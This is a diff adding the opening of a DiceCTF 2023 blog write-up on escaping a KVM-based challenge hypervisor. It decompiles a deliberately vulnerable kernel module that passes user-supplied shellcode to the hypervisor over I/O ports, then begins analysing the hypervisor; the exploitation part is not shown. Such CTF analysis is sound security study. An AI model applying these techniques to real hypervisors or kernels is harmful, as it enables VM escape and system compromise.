@@ -1,0 +1,446 @@
+<!doctype html><html lang=en><head><meta name=viewport content="width=device-width"><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=7"><link rel=icon href=/cyberpunk-cat32x32.png><link rel="shortcut icon" href=/cyberpunk-cat32x32.ico type=image/x-icon><link rel=apple-touch-icon href=/cyberpunk-cat180x180.png><title>Pwning a hypervisor - DiceCTF 2023 &ndash;
+Nikolaos Chalkiadakis</title><link href=/symbols-nerd-font/symbols-nerd-font.css rel=stylesheet integrity="sha512-lydow8GLOLlYNOtHlksNCmGWWCBsbIEtikXpHzfWqx78HLlyQZHOzyLwPpKol4Th6aCwLUXOfODVYgwrd3nwKQ=="><link href=/jetbrains-mono/jetbrains-mono.css rel=stylesheet integrity="sha512-tJxlgL6v1Y7kFf+qB8SloaAMKnOAw6WouknxXtIjkBux9Y/9aX81EUWOJO8c/3l98DmjG8brr4to7zaez606Fg=="><link type=text/css rel=stylesheet href=https://nikoschalk.github.io/css/styles.95efc597cfb8cd9237514b0a9f3ae3201aca96871c8cf8a3072002436ddcaab26db11eea9b1482e12cc8bb1f2510797b62fada880a9b5688b9c6943a94179faa.css integrity="sha512-le/Fl8+4zZI3UUsKnzrjIBrKloccjPijByACQ23cqrJtsR7qmxSC4SzIux8lEHl7YvraiAqbVoi5xpQ6lBefqg=="><meta name=author content="Nikolaos Chalkiadakis"><meta name=keywords content="ctf,diceCTF,hypervisor,pwn"><meta name=description content="rom userland, to kernel, to hypervisor."><meta property="og:site_name" content="Nikolaos Chalkiadakis"><meta property="og:title" content="Pwning a hypervisor - DiceCTF 2023"><meta property="og:type" content="article"><meta property="article:author" content="Nikolaos Chalkiadakis"><meta property="article:published_time" content="2023-02-10T00:00:01Z+0000"><meta property="article:tag" content="ctf"><meta property="article:tag" content="diceCTF"><meta property="article:tag" content="hypervisor"><meta property="article:tag" content="pwn"><meta property="og:url" content="https://nikoschalk.github.io/posts/dicectf23/dice-visor/"><meta property="og:image" content="https://nikoschalk.github.io/post-resources/pacman.png"><meta property="og:description" content="Surviving the trip from userland, to kernel, to hypervisor."><meta name=twitter:card content="summary_large_image"><meta property="twitter:domain" content="nikoschalk.github.io"><meta property="twitter:url" content="https://nikoschalk.github.io/posts/dicectf23/dice-visor/"><meta name=twitter:title content="Pwning a hypervisor - DiceCTF 2023"><meta name=twitter:image content="https://nikoschalk.github.io/post-resources/pacman.png"><meta name=twitter:description content="Surviving the trip from userland, to kernel, to hypervisor."><link rel=manifest href=/manifest/index.json></head><body><div id=baseContainer><header><div class=titleAndSearchContainer><div id=titleContainer><a class=unstyledLink href=/><img src=/cyberpunk-cat512x512.png alt=Logo></a><div class=rightOfLogo><div class=titleAndHamburger><h1><a class=unstyledLink href=/>Nikolaos Chalkiadakis</a></h1></div><div id=wide_nav><nav><ul id=main-nav><li><a href=/>Home</a></li><li><a href=/posts>Posts</a></li><li><a href=/whoami/>whoami</a></li><li><a href=/tags>Tags</a></li></ul></nav></div></div></div><div class=search><input id=searchbar type=text placeholder=Search>
+<a class=nerdlink onclick=newSearch()>&#xf002;</a></div><script>function newSearch(){let e=searchbar.value.trim();if(!e)return;location.href=`/search?q=${e}`}searchbar.onkeyup=e=>{e.keyCode==13&&newSearch()}</script></div><div id=links><a rel=noreferrer target=_blank class=nerdlink href=https://github.com/nikosChalk>&#xf09b;
+<span>GitHub</span></a>
+<a rel=noreferrer target=_blank class=nerdlink href=https://www.linkedin.com/in/chalkn>&#xf0e1;
+<span>LinkedIn</span></a>
+<a rel=noreferrer target=_blank class=nerdlink href=https://ctftime.org/user/128082><img src=/ctf-timefavicon.png width=14px>
+<span>CTFTime</span></a></div></header><div id=contentContainer><div id=content><main><article class="card single"><h1>Pwning a hypervisor - DiceCTF 2023</h1><p class=date><span title=Date> </span>2023, February 10</p><div class=articleToc style=display:flex><div><nav id=TableOfContents><ul><li><a href=#recon>Recon</a></li><li><a href=#analysis---vulnko>Analysis - vuln.ko</a></li><li><a href=#analysis---dice-visor>Analysis - dice-visor</a><ul><li><a href=#seccomp-filter>seccomp filter</a></li></ul></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#shellcode-generation>Shellcode generation</a></li><li><a href=#getting-the-flag>Getting the flag</a></li></ul></li></ul></nav></div><div style=flex:1><figure style=margin:0><img src=/post-resources/pacman.png alt></figure></div></div><hr><div><p>Categories: Pwn</p><p>Description:</p><blockquote><p>Welcome to DiceGang&rsquo;s newest hypervisor-based security solution, Dicer-Visor.</p><p><code>nc mc.ax 31313</code></p><p>author: SmoothHacker</p><p><a href=https://github.com/nikosChalk/ctf-writeups/raw/master/diceCTF23/pwn/dice-visor/src/initramfs.cpio.gz>initramfs.cpio.gz</a> <a href=https://github.com/nikosChalk/ctf-writeups/raw/master/diceCTF23/pwn/dice-visor/src/dicer-visor>dicer-visor</a> <a href=https://github.com/nikosChalk/ctf-writeups/raw/master/diceCTF23/pwn/dice-visor/src/bzImage>bzImage</a></p></blockquote><hr><h2 id=recon>Recon</h2><p>For this challenge, we are given 3 files: A kernel image, an initramfs, and the <code>dicer-visor</code> binary which is the hypervisor itself.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>fane@ctf-box:~/dicer-visor$ file dicer-visor
+</span></span><span style=display:flex><span>dicer-visor: ELF 64-bit LSB pie executable, x86-64, version <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>SYSV<span style=color:#f92672>)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style=color:#f92672>[</span>sha1<span style=color:#f92672>]=</span>f9ef7fc5756088242c50b7f6b1dbee7ccee624de, <span style=color:#66d9ef>for</span> GNU/Linux 3.2.0, not stripped
+</span></span><span style=display:flex><span>fane@ctf-box:~/dicer-visor$ ./dicer-visor
+</span></span><span style=display:flex><span>Usage: ./dicer-visor &lt;bzImage&gt; &lt;initrd&gt;
+</span></span></code></pre></div><p>Let&rsquo;s run the challenge locally:</p><pre tabindex=0><code class=language-log data-lang=log>fane@ctf-box:~/dicer-visor$ ./dicer-visor bzImage initramfs.cpio.gz
+Dicer-visor - DiceGang Security Hypervisor
+[*] Created VM
+[*] Loaded kernel image: bzImage
+[*] Loaded initrd image: initramfs.cpio.gz
+[*] Starting up VM
+Booting from ROM...
+[    0.000000] Linux version 6.0.0 (scott@blackrock) (gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, GNU 3
+[    0.000000] Command line: console=ttyS0 nokaslr
+[    0.000000] x86/fpu: Supporting XSAVE feature 0x001: &#39;x87 floating point registers&#39;
+[    0.000000] x86/fpu: Supporting XSAVE feature 0x002: &#39;SSE registers&#39;
+...
+[    0.468004] Run /init as init process
+/init: line 7: can&#39;t create /sys/module/rcutree/parameters/rcu_cpu_stall_suppress: nonexistent directy
+[    0.528008] vuln: loading out-of-tree module taints kernel.
+[    0.532008] [!] Vulnerable Driver Loaded
+/bin/sh: can&#39;t access tty; job control turned off
+/ # uname -a
+Linux (none) 6.0.0 #15 Fri Feb 3 13:31:55 UTC 2023 x86_64 GNU/Linux
+/ #
+</code></pre><p>So, the binary spawns a VM with the given initramfs and drops us to a shell. The VM is running a kernel version 6.0.0 and from the logs we also see that it loads a weird kernel module (<code>[!] Vulnerable Driver Loaded</code>). Inside the initramfs, we find the <code>vuln.ko</code> kernel module which we will analyze in a bit. We also can see the contents of <code>init</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/ <span style=color:#75715e># cat init</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#!/bin/sh</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#mount -t proc none /proc</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#mount -t sysfs none /sys</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#mount -t debugfs none /sys/kernel/debug</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>echo <span style=color:#ae81ff>1</span> &gt; /sys/module/rcutree/parameters/rcu_cpu_stall_suppress
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>/sbin/insmod /vuln.ko
+</span></span><span style=display:flex><span>mknod /dev/exploited-device c <span style=color:#ae81ff>32</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>exec /bin/sh
+</span></span><span style=display:flex><span>/ <span style=color:#75715e>#</span>
+</span></span></code></pre></div><p>Interesting! The <code>vuln.ko</code> kernel module is loaded and the character device <code>/dev/exploited-device</code> is created. But what is the exploitation strategy here? Probably we need to interact with <code>vuln.ko</code> from inside the VM, which in turn will interact with the hypervisor, and we have to exploit that latter interaction. Let&rsquo;s also try running on remote:</p><p>When we connect to the remote, it asks us for a URL to download an <code>initramfs</code> and then spawns the VM. When providing the original <code>initramfs</code>, after the VM loads, we get a kernel panic, probably crashing at <code>exec /bin/sh</code> in <code>init</code>. This is because on the remote side they probably have deleted the contents of <code>/bin/*</code> to avoid easy exploitation. So, let&rsquo;s start analyzing the challenge files.</p><h2 id=analysis---vulnko>Analysis - vuln.ko</h2><p>First, let&rsquo;s extract the <code>initramfs</code> and load the <code>vuln.ko</code> in ghidra. We first analyze the entry and exit points of the kernel module which are <code>init_module</code> and <code>cleanup_module</code> respectively:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>init_module</span>(<span style=color:#66d9ef>void</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> lVar1;
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>__register_chrdev</span>(<span style=color:#ae81ff>0x20</span>,<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>0x100</span>,<span style=color:#e6db74>&#34;exploited-device&#34;</span>,fops);
+</span></span><span style=display:flex><span>  lVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>__request_region</span>(<span style=color:#f92672>&amp;</span>ioport_resource,<span style=color:#ae81ff>0xdead</span>,<span style=color:#ae81ff>1</span>,<span style=color:#e6db74>&#34;exploited-device&#34;</span>,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (lVar1 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>_printk</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x011</span><span style=color:#e6db74>[!] IO port allocation of 0x%x failed</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#ae81ff>0xdead</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>    lVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>__request_region</span>(<span style=color:#f92672>&amp;</span>ioport_resource,<span style=color:#ae81ff>0xd1ce</span>,<span style=color:#ae81ff>1</span>,<span style=color:#e6db74>&#34;exploited-device&#34;</span>,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (lVar1 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>_printk</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x011</span><span style=color:#e6db74>[!] IO port allocation of 0x%x failed</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#ae81ff>0xd1ce</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>_printk</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x011</span><span style=color:#e6db74>[!] Vulnerable Driver Loaded</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>__x86_return_thunk</span>();
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>cleanup_module</span>(<span style=color:#66d9ef>void</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>__x86_return_thunk</span>();
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>As we can see, the <code>init_module</code> creates the <strong>character device</strong> <code>/dev/exploited-device</code> with major number 32, base minor 0, and 0x100 minor numbers available to it (<a href=https://www.kernel.org/doc/htmldocs/kernel-api/API---register-chrdev.html>docs/<code>__register_chrdev</code></a>). Next, it creates to regions for this device, both with size 1 byte. The first region is ad address <code>0xdead</code> and the second region at address <code>0xd1ce</code> (<a href=https://www.kernel.org/doc/htmldocs/kernel-api/API---request-region.html>docs/<code>__request_region</code></a>).</p><p>The <code>fops</code> variable in <code>__register_chrdev()</code>, is a global variable that defines what operations are allowed on the character devices and how it should behave under these operations. Usually, userland applications interact with the device through the <code>/dev</code> filesystem and file descriptors. From the <code>init</code> file, you should recall the line <code>mknod /dev/exploited-device c 32 0</code>, which makes a special <strong>character device</strong> with the same major and minor numbers as in the <code>__register_chrdev()</code> call.</p><p>Back to the <code>fops</code> variable. This variable is of type <code>struct file_operations</code> and is basically a <a href=https://elixir.bootlin.com/linux/v6.0/source/include/linux/fs.h#L2093>big list of function pointers</a>. These function pointers describe how the character device behaves when interacted as a file through <code>/dev/exploited-device</code>, e.g. via <code>open</code>, <code>read</code>, <code>ioctl</code>, etc.</p><p>So, let&rsquo;s examine all the registered function pointers in <code>fops</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>char</span> shellcode[<span style=color:#ae81ff>256</span>]; <span style=color:#75715e>//global variable
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>open</span>(<span style=color:#66d9ef>struct</span> inode <span style=color:#f92672>*</span>, <span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>) { 
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>release</span>(<span style=color:#66d9ef>struct</span> inode <span style=color:#f92672>*</span>, <span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>ssize_t</span> <span style=color:#a6e22e>read</span>(<span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>, <span style=color:#66d9ef>char</span> __user <span style=color:#f92672>*</span>, <span style=color:#66d9ef>size_t</span>, <span style=color:#66d9ef>loff_t</span> <span style=color:#f92672>*</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>ssize_t</span> <span style=color:#a6e22e>write</span>(<span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> __user <span style=color:#f92672>*</span> __buf, <span style=color:#66d9ef>size_t</span> __n, <span style=color:#66d9ef>loff_t</span> <span style=color:#f92672>*</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>size_t</span> copy_sz;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>ssize_t</span> sVar1;
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  copy_sz <span style=color:#f92672>=</span> <span style=color:#a6e22e>MIN</span>(__n, <span style=color:#ae81ff>0x100</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>_copy_from_user</span>(shellcode,__buf,copy_sz);
+</span></span><span style=display:flex><span>  sVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>__x86_return_thunk</span>();
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> sVar1;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>tl_ioctl</span>(<span style=color:#66d9ef>struct</span> file <span style=color:#f92672>*</span>file, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> cmd, <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span>) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> i;
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>_printk</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x011</span><span style=color:#e6db74>[!] driver ioctl issued - cmd: %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, cmd);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (cmd <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xbeef</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>OUT</span>(<span style=color:#ae81ff>0xd1ce</span>,<span style=color:#ae81ff>0xd1ce</span>); <span style=color:#75715e>//OUT DX,AX
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>native_io_delay</span>();
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (cmd <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xdead</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span>(i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; i<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>0x100</span>; i<span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>OUT</span>(<span style=color:#ae81ff>0xdead</span>,shellcode[i]); <span style=color:#75715e>//OUT DX,AL
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      <span style=color:#a6e22e>native_io_delay</span>();
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>So, to summarize the above operations:</p><ul><li><code>open</code>: noop.</li><li><code>release</code>: noop</li><li><code>read</code>: noop</li><li><code>write</code>: Writes to the global <code>shellcode</code> kernel buffer up to <code>0x100</code> bytes provided by the userland <code>buf</code>.</li><li><code>ioctl</code>: The <a href=https://c9x.me/x86/html/file_module_x86_id_222.html><code>OUT</code></a> that appear in the body of the function, are x86-specific assembly instructions. These instructions are used for port I/O, i.e. communication with hardware peripherals. Since we are running inside a VM, we expect that these instructions will cause a trap to the hypervisor. (Usually the VM runs at a lower privilege level than these instructions can be executed [<a href=https://people.eecs.berkeley.edu/~kubitron/cs262/lectures/lec13-VM1.pdf>1</a>, <a href=http://www.cs.cmu.edu/~410-f06/lectures/L31_Virtualization.pdf>2</a>, <a href=http://www.cs.cmu.edu/~410-s09/lectures/L33_Virtualization.pdf>3</a>])</li></ul><p>So, the <code>ioctl</code> command <code>0xbeef</code> writes to the I/O port <code>0xd1ce</code> the value <code>d1ce</code>; and the <code>iotctl</code> command <code>0xdead</code> writes to the I/O port <code>0xdead</code> the <code>shellcode</code> buffer (<code>0x100</code> bytes). Now it&rsquo;s time to analyze the hypervisor!</p><h2 id=analysis---dice-visor>Analysis - dice-visor</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>fane@ctf-box:~/dicer-visor$ file dicer-visor
+</span></span><span style=display:flex><span>dicer-visor: ELF 64-bit LSB pie executable, x86-64, version <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>SYSV<span style=color:#f92672>)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style=color:#f92672>[</span>sha1<span style=color:#f92672>]=</span>f9ef7fc5756088242c50b7f6b1dbee7ccee624de, <span style=color:#66d9ef>for</span> GNU/Linux 3.2.0, not stripped
+</span></span></code></pre></div><p>Fortunately, the hypervisor still has symbols as it is not stripped. Let&rsquo;s start the analysis from the <code>main</code> function:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc,<span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> iVar1;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>err_msg;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> aiStack72 [<span style=color:#ae81ff>2</span>];
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> fd;
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>setvbuf</span>(stdout,(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#ae81ff>0x0</span>,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>setvbuf</span>(stdin,(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#ae81ff>0x0</span>,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>setvbuf</span>(stderr,(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#ae81ff>0x0</span>,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (argc <span style=color:#f92672>!=</span> <span style=color:#ae81ff>3</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fwrite</span>(<span style=color:#e6db74>&#34;Usage: ./dicer-visor &lt;bzImage&gt; &lt;initrd&gt;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#ae81ff>0x28</span>,<span style=color:#ae81ff>1</span>,stderr);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Dicer-visor - DiceGang Security Hypervisor&#34;</span>);
+</span></span><span style=display:flex><span>  fd <span style=color:#f92672>=</span> <span style=color:#a6e22e>open</span>(<span style=color:#e6db74>&#34;/dev/kvm&#34;</span>,<span style=color:#ae81ff>0x80002</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (fd <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>err</span>(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;/dev/kvm&#34;</span>);
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>    iVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>ioctl</span>(fd,<span style=color:#ae81ff>0xae00</span>,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (iVar1 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xc</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>init_vm</span>(aiStack72);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;[*] Created VM&#34;</span>);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>load_vm</span>((<span style=color:#66d9ef>long</span>)aiStack72,argv[<span style=color:#ae81ff>1</span>],argv[<span style=color:#ae81ff>2</span>]);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[*] Loaded kernel image: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,argv[<span style=color:#ae81ff>1</span>]);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[*] Loaded initrd image: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,argv[<span style=color:#ae81ff>2</span>]);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;[*] Starting up VM&#34;</span>);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>run_vm</span>(aiStack72);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>cleanup_vm</span>(aiStack72);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;[*] Exited VM&#34;</span>);
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (iVar1 <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>err</span>(<span style=color:#ae81ff>1</span>,<span style=color:#e6db74>&#34;KVM_GET_API_VERSION %d, expected 12&#34;</span>,iVar1);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>err</span>(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;KVM_GET_API_VERSION&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>As we see, the hypervisors uses the <a href=https://docs.kernel.org/virt/kvm/api.html>Kernel&rsquo;s KVM API</a> to create the virtual machine. <code>init_vm</code> performs a lot of <code>ioctl</code> system calls, while <code>load_vm</code> does not perform any <code>ioctl</code> and simply <code>mmap</code>s the bzImage and the initramfs, sets some state variables in <code>aiStack72</code>, and then returns. The value <code>0xae00</code> in the <code>ioctl</code>, corresponds to the <a href=https://elixir.bootlin.com/linux/v6.0/source/include/uapi/linux/kvm.h#L917><code>#define KVM_GET_API_VERSION _IO(KVMIO, 0x00)</code></a>, where <a href=https://elixir.bootlin.com/linux/v6.0/source/include/uapi/linux/kvm.h#L889><code>KVMIO</code> holds the value 0xAE</a>. With a little bit of manual reverse engineering effort, we recover the struct for <code>aiStack72</code> and also have a clean decompilation of the whole hypervisor:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// ghidra-kvm.h contains struct definitions and macro #defines related to the KVM API.
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// Extracted from the source code of the Linux kernel.
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// e.g. from https://elixir.bootlin.com/linux/v6.0/source/include/uapi/linux/kvm.h
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// Consult the kernel source code and its documentation for what the structs are.
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// file located in solution/ghidra-kvm.h
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;ghidra-kvm.h&#34;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> vm {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> vm_fd;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> vcpu_fd;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> kvm_fd;
+</span></span><span style=display:flex><span>    undefined[<span style=color:#ae81ff>4</span>] padding;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>userspace_address;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>undefined8 <span style=color:#a6e22e>init_vm</span>(<span style=color:#66d9ef>struct</span> vm <span style=color:#f92672>*</span>vm);
+</span></span><span style=display:flex><span>undefined8 <span style=color:#a6e22e>load_vm</span>(<span style=color:#66d9ef>struct</span> vm <span style=color:#f92672>*</span>vm,<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>bzImage_path,<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>initramfs_path);
